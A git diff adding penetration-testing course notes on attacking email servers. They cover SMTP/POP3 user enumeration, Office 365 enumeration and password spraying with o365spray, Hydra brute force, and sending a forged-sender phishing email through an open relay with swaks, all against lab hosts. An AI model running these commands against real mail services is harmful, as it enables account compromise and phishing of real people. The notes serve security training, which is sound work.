@@ -1227,3 +1227,200 @@ support.inlanefreight.com is an alias for inlanefreight.s3.amazonaws.com
 
 ### Results:
 - Target machine traffic to `inlanefreight.com` is redirected to attacker’s IP (`192.168.225.110`).
+
+# Attacking Email Services
+**Understanding Email Servers**
+- **Mail Server**: Handles and delivers email over a network.
+- **Client Device**: Where we read emails (e.g., computers, smartphones).
+- **SMTP (Simple Mail Transfer Protocol)**: Delivers emails from clients to servers and between servers.
+- **POP3/IMAP4**: Protocols for downloading emails to a client device.
+
+**Enumeration**
+- **Purpose**: Identify multiple servers, ports, and services.
+- **MX Records**: Use DNS records to identify mail servers. These records specify the mail servers responsible for accepting email messages on behalf of a domain name.
+
+**Enumeration Commands**:
+```bash
+# Using host to find MX records
+host -t MX hackthebox.eu
+
+# Example output:
+# hackthebox.eu mail is handled by 1 aspmx.l.google.com.
+
+host -t MX microsoft.com
+
+# Example output:
+# microsoft.com mail is handled by 10 microsoft-com.mail.protection.outlook.com.
+
+# Using dig to find MX records
+dig mx plaintext.do | grep "MX" | grep -v ";"
+
+# Example output:
+# plaintext.do.           7076    IN      MX      50 mx3.zoho.com.
+# plaintext.do.           7076    IN      MX      10 mx.zoho.com.
+# plaintext.do.           7076    IN      MX      20 mx2.zoho.com.
+
+dig mx inlanefreight.com | grep "MX" | grep -v ";"
+
+# Example output:
+# inlanefreight.com.      300     IN      MX      10 mail1.inlanefreight.com.
+```
+
+**Enumerating Ports**
+- **Common Ports**:
+  - TCP/25: SMTP Unencrypted
+  - TCP/143: IMAP4 Unencrypted
+  - TCP/110: POP3 Unencrypted
+  - TCP/465: SMTP Encrypted
+  - TCP/587: SMTP Encrypted/STARTTLS
+  - TCP/993: IMAP4 Encrypted
+  - TCP/995: POP3 Encrypted
+
+**Nmap Command**:
+```bash
+sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 <target IP>
+
+# Example output:
+# Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-27 17:56 CEST
+# Nmap scan report for 10.129.14.128
+# Host is up (0.00025s latency).
+# PORT   STATE SERVICE VERSION
+# 25/tcp open  smtp    Postfix smtpd
+# |_smtp-commands: mail1.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
+# MAC Address: 00:00:00:00:00:00 (VMware)
+```
+
+**Misconfigurations**
+- **Authentication**: Issues arise when the SMTP service allows anonymous authentication.
+- **SMTP Commands**:
+  - **VRFY**: Verify if a user exists.
+  ```bash
+  telnet <target IP> 25
+
+  # Example commands and output:
+  # VRFY root
+  # 252 2.0.0 root
+
+  # VRFY new-user
+  # 550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
+  ```
+  - **EXPN**: List users in a distribution list.
+  ```bash
+  telnet <target IP> 25
+
+  # Example commands and output:
+  # EXPN john
+  # 250 2.1.0 john@inlanefreight.htb
+
+  # EXPN support-team
+  # 250 2.0.0 carol@inlanefreight.htb
+  # 250 2.1.5 elisa@inlanefreight.htb
+  ```
+  - **RCPT TO**: Identify email recipients.
+  ```bash
+  telnet <target IP> 25
+
+  # Example commands and output:
+  # MAIL FROM:test@htb.com
+  # RCPT TO:julio
+  # 550 5.1.1 julio... User unknown
+
+  # RCPT TO:john
+  # 250 2.1.5 john... Recipient ok
+  ```
+
+**POP3 Enumeration**: Using `USER` command to check if a user exists.
+```bash
+telnet <target IP> 110
+
+# Example commands and output:
+# USER julio
+# -ERR
+
+# USER john
+# +OK
+```
+
+**Automation**
+- **Tool**: `smtp-user-enum`
+- **Command**: 
+```bash
+smtp-user-enum -M RCPT -U userlist.txt -D <domain> -t <target IP>
+
+# Example output:
+# 10.129.203.7: jose@inlanefreight.htb exists
+# 10.129.203.7: pedro@inlanefreight.htb exists
+# 10.129.203.7: kate@inlanefreight.htb exists
+```
+## Cloud Enumeration
+
+- **Context**: Cloud service providers have custom implementations for email services, often providing unique attack vectors. These services frequently include features that can be exploited for tasks like username enumeration.
+
+**Example Tool: O365spray**
+- **Purpose**: O365spray is a tool used for username enumeration and password spraying specifically targeted at Microsoft Office 365 (O365). It was developed to implement various enumeration and spray techniques.
+  
+**Validating Domain with O365 Spray:**
+```bash
+python3 o365spray.py --validate --domain msplaintext.xyz
+
+# Example output:
+# [2022-04-13 09:46:40,743] INFO : [VALID] The following domain is using O365: msplaintext.xyz
+```
+- **Explanation**: This command checks if the target domain (e.g., msplaintext.xyz) is using Office 365 services.
+
+**Enumerating Usernames with O365 Spray:**
+```bash
+python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
+
+# Example output:
+# [2022-04-13 09:48:08,244] INFO : [VALID] lewen@msplaintext.xyz
+# [2022-04-13 09:48:10,415] INFO : [VALID] juurena@msplaintext.xyz
+```
+- **Explanation**: This command attempts to enumerate usernames from a provided list (`users.txt`) against the specified domain.
+
+### Password Attacks
+
+- **Context**: Password attacks involve guessing or cracking passwords to gain unauthorized access. Hydra is a popular tool used for these types of attacks, supporting various protocols like SMTP, POP3, and IMAP4.
+
+**Example Tool: Hydra**
+- **Purpose**: Hydra can perform password spray or brute force attacks by trying various combinations of usernames and passwords against a target service.
+
+**Hydra - Password Attack for POP3:**
+```bash
+hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
+
+# Example output:
+# [110][pop3] host: 10.129.42.197 login: john password: Company01!
+```
+- **Explanation**: This command uses Hydra to attempt logging in to the POP3 service at `10.10.110.20` using usernames from `users.txt` and a single password `'Company01!'`.
+
+**Advanced Tools for Cloud Services:**
+- **Context**: Standard tools may be blocked by security measures. Custom tools like **o365spray**, **MailSniper** (for Office 365), or **CredKing** (for Gmail or Okta) can be used instead.
+  
+**O365 Spray - Password Spraying:**
+```bash
+python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
+
+# Example output:
+# [2022-04-14 12:26:33,025] INFO : [VALID] lewen@msplaintext.xyz:March2022!
+```
+- **Explanation**: This command performs a password spray attack using usernames from `usersfound.txt` and the password `'March2022!'` against the specified domain.
+
+### Protocol-Specific Attacks
+
+- **Context**: Attacks can be tailored to specific protocols used by email services. One such attack is exploiting an **Open Relay**, which allows unauthenticated email relays.
+
+**Detecting Open Relay with Nmap:**
+```bash
+nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
+
+# Example output:
+# |_smtp-open-relay: Server is an open relay (14/16 tests)
+```
+- **Explanation**: This command uses Nmap to check if the SMTP server at `10.10.11.213` is configured as an open relay.
+
+**Sending Email Using Open Relay:**
+```bash
+swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
+```
+- **Explanation**: This command uses the Swaks tool to send an email from a forged address to multiple recipients via an open relay server, potentially for phishing purposes.
